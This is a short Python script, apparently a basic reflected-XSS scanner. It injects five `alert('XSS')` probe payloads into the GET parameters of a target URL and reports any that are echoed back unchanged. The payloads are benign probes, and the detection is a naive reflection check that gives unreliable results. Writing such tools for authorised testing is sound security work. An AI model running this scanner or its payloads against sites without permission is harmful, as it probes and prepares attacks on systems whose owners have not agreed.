import requests
from bs4 import BeautifulSoup
import argparse

# Common XSS payloads
payloads = [
    "<script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
]

def scan_xss(url, params, cookies=None):
    for param in params:
        for payload in payloads:
            # Create a copy of the parameters and inject the payload
            test_params = params.copy()
            test_params[param] = payload
            try:
                response = requests.get(url, params=test_params, cookies=cookies)
                print(f"Testing {param} with payload: {payload}")
                print(f"URL: {response.url}")
                
                if payload in response.text:
                    print(f"[!] Potential XSS vulnerability found with payload: {payload}")
                    print(f"Parameter: {param}")
                    print(f"URL: {response.url}")
                    print("="*50)
                else:
                    print(f"[+] No XSS vulnerability found with payload: {payload} on parameter: {param}")
                    print("="*50)
            except requests.RequestException as e:
                print(f"Error during request: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple XSS Scanner")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("params", nargs="+", help="Parameters to test (e.g., 'param1 param2')")
    parser.add_argument("--cookies", help="Cookies to include in the request (key=value;key2=value2)")

    args = parser.parse_args()
    
    target_url = args.url
    parameters = {param: "" for param in args.params}

    cookies = None
    if args.cookies:
        cookies = dict(item.split("=") for item in args.cookies.split(";"))

    # Perform the scan
    scan_xss(target_url, parameters, cookies)
